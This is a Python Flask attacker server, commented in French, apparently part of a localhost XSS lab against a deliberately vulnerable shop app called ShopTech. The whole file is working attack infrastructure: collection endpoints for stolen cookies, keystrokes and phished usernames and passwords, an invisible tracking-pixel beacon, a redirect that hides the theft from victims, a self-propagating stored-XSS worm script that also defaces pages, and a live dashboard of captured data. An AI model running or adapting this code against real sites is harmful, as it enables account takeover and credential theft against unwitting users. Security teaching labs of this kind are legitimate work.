"""
Serveur attaquant — port 8000
Capture les cookies et keystrokes exfiltrés depuis ShopTech (port 5000).
"""

import os
from datetime import datetime
from flask import Flask, jsonify, request, render_template_string, redirect

app = Flask(__name__)

captured = []   # liste de tous les événements capturés

# ---------------------------------------------------------------------------
# Dashboard HTML (dark terminal theme)
# ---------------------------------------------------------------------------

DASHBOARD = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="2">
<title>Attacker Dashboard — ShopTech</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; font-size: 14px; }
  header { background: #111; border-bottom: 2px solid #00ff41; padding: 16px 24px; display: flex; align-items: center; gap: 12px; }
  header h1 { font-size: 20px; letter-spacing: 2px; }
  header .badge { background: #ff0040; color: #fff; border-radius: 4px; padding: 2px 8px; font-size: 12px; }
  .stats { display: flex; gap: 24px; padding: 16px 24px; background: #111; border-bottom: 1px solid #1a1a1a; }
  .stat { text-align: center; }
  .stat .value { font-size: 28px; font-weight: bold; color: #00ff41; }
  .stat .label { font-size: 11px; color: #555; text-transform: uppercase; letter-spacing: 1px; }
  main { padding: 24px; }
  section { margin-bottom: 32px; }
  section h2 { font-size: 14px; letter-spacing: 2px; color: #ff0040; border-bottom: 1px solid #1a1a1a; padding-bottom: 8px; margin-bottom: 12px; }
  table { width: 100%; border-collapse: collapse; }
  th { background: #111; color: #555; font-size: 11px; letter-spacing: 1px; text-transform: uppercase; padding: 8px 12px; text-align: left; }
  td { padding: 8px 12px; border-bottom: 1px solid #1a1a1a; word-break: break-all; }
  tr:hover td { background: #0f1f0f; }
  .time { color: #555; font-size: 12px; white-space: nowrap; }
  .ip   { color: #ffaa00; }
  .src  { color: #00aaff; }
  .val  { color: #00ff41; }
  .empty { color: #333; font-style: italic; padding: 16px 12px; }
  .tag-cookie  { background: #1a0a00; color: #ffaa00; border-radius: 3px; padding: 1px 6px; font-size: 11px; }
  .tag-keylog  { background: #00001a; color: #00aaff; border-radius: 3px; padding: 1px 6px; font-size: 11px; }
  .tag-csrf    { background: #1a0010; color: #ff0040; border-radius: 3px; padding: 1px 6px; font-size: 11px; }
  footer { padding: 16px 24px; color: #333; font-size: 12px; border-top: 1px solid #1a1a1a; }
</style>
</head>
<body>

<header>
  <span style="font-size:24px;">💀</span>
  <h1>ATTACKER DASHBOARD</h1>
  <span class="badge">LIVE</span>
  <span style="margin-left:auto; color:#555; font-size:12px;">auto-refresh 2s &mdash; {{ now }}</span>
</header>

<div class="stats">
  <div class="stat"><div class="value">{{ total }}</div><div class="label">Captures totales</div></div>
  <div class="stat"><div class="value">{{ cookies|length }}</div><div class="label">Cookies volés</div></div>
  <div class="stat"><div class="value">{{ keylogs|length }}</div><div class="label">Keystrokes</div></div>
  <div class="stat"><div class="value">{{ csrf_events|length }}</div><div class="label">CSRF exécutés</div></div>
</div>

<main>

  <section>
    <h2>🍪 COOKIES VOLÉS — Reflected / Stored XSS</h2>
    <table>
      <thead><tr><th>Heure</th><th>IP victime</th><th>Page source</th><th>Valeur du cookie</th></tr></thead>
      <tbody>
      {% if cookies %}
        {% for e in cookies|reverse %}
        <tr>
          <td class="time">{{ e.time }}</td>
          <td class="ip">{{ e.ip }}</td>
          <td class="src">{{ e.src }}</td>
          <td class="val">{{ e.cookie }}</td>
        </tr>
        {% endfor %}
      {% else %}
        <tr><td colspan="4" class="empty">En attente d'une victime... Envoyer le lien piégé.</td></tr>
      {% endif %}
      </tbody>
    </table>
  </section>

  <section>
    <h2>⌨️  KEYLOGGER — Stored XSS niveau 3 (persistant)</h2>
    <table>
      <thead><tr><th>Heure</th><th>IP victime</th><th>Page</th><th>Keystroke</th></tr></thead>
      <tbody>
      {% if keylogs %}
        {% for e in keylogs|reverse %}
        <tr>
          <td class="time">{{ e.time }}</td>
          <td class="ip">{{ e.ip }}</td>
          <td class="src">{{ e.src }}</td>
          <td class="val">{{ e.key }}</td>
        </tr>
        {% endfor %}
      {% else %}
        <tr><td colspan="4" class="empty">En attente de saisies clavier...</td></tr>
      {% endif %}
      </tbody>
    </table>
  </section>

  <section>
    <h2>👤 PRISES DE CONTRÔLE DE COMPTE — Chaîne XSS+CSRF</h2>
    <table>
      <thead><tr><th>Heure</th><th>IP victime</th><th>Type</th><th>Nouvelle valeur</th></tr></thead>
      <tbody>
      {% if csrf_events %}
        {% for e in csrf_events|reverse %}
        <tr>
          <td class="time">{{ e.time }}</td>
          <td class="ip">{{ e.ip }}</td>
          <td><span class="tag-csrf">{{ e.type }}</span></td>
          <td class="val">{{ e.value }}</td>
        </tr>
        {% endfor %}
      {% else %}
        <tr><td colspan="4" class="empty">En attente d'une victime consultant la fiche produit piégée...</td></tr>
      {% endif %}
      </tbody>
    </table>
  </section>

  <section>
    <h2>🎣 IDENTIFIANTS VOLÉS — Faux formulaire de login (Phishing XSS)</h2>
    <table>
      <thead><tr><th>Heure</th><th>IP victime</th><th>Username</th><th>Password</th></tr></thead>
      <tbody>
      {% if phishing %}
        {% for e in phishing|reverse %}
        <tr>
          <td class="time">{{ e.time }}</td>
          <td class="ip">{{ e.ip }}</td>
          <td class="val">{{ e.username }}</td>
          <td style="color:#ff0040; font-weight:bold;">{{ e.password }}</td>
        </tr>
        {% endfor %}
      {% else %}
        <tr><td colspan="4" class="empty">En attente d'une victime remplissant le faux formulaire...</td></tr>
      {% endif %}
      </tbody>
    </table>
  </section>

</main>

<footer>Serveur attaquant en écoute sur :8000 &mdash; ShopTech vulnérable sur :5000</footer>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Endpoints d'exfiltration
# ---------------------------------------------------------------------------

@app.route("/steal")
def steal():
    """Point de collecte via new Image().src (GET sans CORS)."""
    cookie = request.args.get("c", "")
    key    = request.args.get("k", "")
    src    = request.args.get("src", request.referrer or "unknown")
    ip     = request.remote_addr
    now    = datetime.now().strftime("%H:%M:%S")

    if key:
        captured.append({"type": "keylog", "time": now, "ip": ip, "src": src, "key": key})
    elif cookie:
        captured.append({"type": "cookie", "time": now, "ip": ip, "src": src, "cookie": cookie})

    # Pixel transparent 1×1 (réponse invisible pour la victime)
    return (
        b"\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff"
        b"\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00"
        b"\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b",
        200,
        {
            "Content-Type": "image/gif",
            "Access-Control-Allow-Origin": "*",
        },
    )


@app.route("/exfil", methods=["POST", "OPTIONS"])
def exfil():
    """Point de collecte via fetch() (POST JSON) — utilisé par la chaîne XSS+CSRF."""
    if request.method == "OPTIONS":
        return "", 204, {
            "Access-Control-Allow-Origin": "*",
            "Access-Control-Allow-Methods": "POST",
            "Access-Control-Allow-Headers": "Content-Type",
        }

    data  = request.get_json(silent=True) or {}
    ip    = request.remote_addr
    now   = datetime.now().strftime("%H:%M:%S")

    event_type = data.get("type", "generic")
    value      = data.get("value", str(data))

    captured.append({
        "type":  event_type,
        "time":  now,
        "ip":    ip,
        "src":   data.get("src", "unknown"),
        "value": value,
        "raw":   data,
    })

    return "", 204, {"Access-Control-Allow-Origin": "*"}

@app.route("/credentials")
def credentials():
    """Point de collecte des identifiants volés via le faux formulaire de login."""
    username = request.args.get("username", "")
    password = request.args.get("password", "")
    ip  = request.remote_addr
    now = datetime.now().strftime("%H:%M:%S")

    captured.append({
        "type":     "phishing",
        "time":     now,
        "ip":       ip,
        "src":      request.referrer or "unknown",
        "username": username,
        "password": password,
    })

    # Rediriger la victime vers la vraie page de login — rien de suspect
    return redirect("http://localhost:5000/")

@app.route("/worm.js")
def worm_js():
    js = """
    [2,3,4,5,6].forEach(function(i){
      fetch('/product/'+i,{
        method:'POST',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:'rating=5&review='+encodeURIComponent('<script src="http://localhost:8000/worm.js"><\\/script>'),
        credentials:'include'
      });
    });
    setTimeout(function(){
      document.documentElement.innerHTML='<html><body style="background:#000;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh"><h1 style="color:red;font-size:80px;text-align:center;text-shadow:0 0 40px red">&#9888; HACKED &#9888;</h1><p style="color:#fff;font-size:24px;text-align:center">Ce site a ete compromis par une attaque XSS</p><p style="color:#ff4444;font-size:16px">ShopTech XSS Worm - 2026</p></body></html>';
    }, 500);
    """

    from flask import Response
    return Response(js, mimetype="application/javascript", headers={"Access-Control-Allow-Origin": "*"})

# ---------------------------------------------------------------------------
# Dashboard et API
# ---------------------------------------------------------------------------

@app.route("/dashboard")
@app.route("/")
def dashboard():
    cookies     = [e for e in captured if e["type"] == "cookie"]
    keylogs     = [e for e in captured if e["type"] == "keylog"]
    phishing    = [e for e in captured if e["type"] == "phishing"]
    csrf_events = [e for e in captured if e["type"] not in ("cookie", "keylog", "phishing")]

    return render_template_string(
        DASHBOARD,
        cookies=cookies,
        keylogs=keylogs,
        csrf_events=csrf_events,
        phishing=phishing,
        total=len(captured),
        now=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    )


@app.route("/api/data")
def api_data():
    return jsonify(captured)


@app.route("/reset", methods=["POST"])
def reset():
    captured.clear()
    return jsonify({"cleared": True})


# ---------------------------------------------------------------------------

if __name__ == "__main__":
    print("\n" + "="*60)
    print("  💀 Serveur attaquant démarré sur http://localhost:8000")
    print("  📊 Dashboard : http://localhost:8000/dashboard")
    print("="*60 + "\n")
    debug = os.getenv("FLASK_DEBUG", "false").lower() == "true"
    app.run(debug=debug, port=8000)
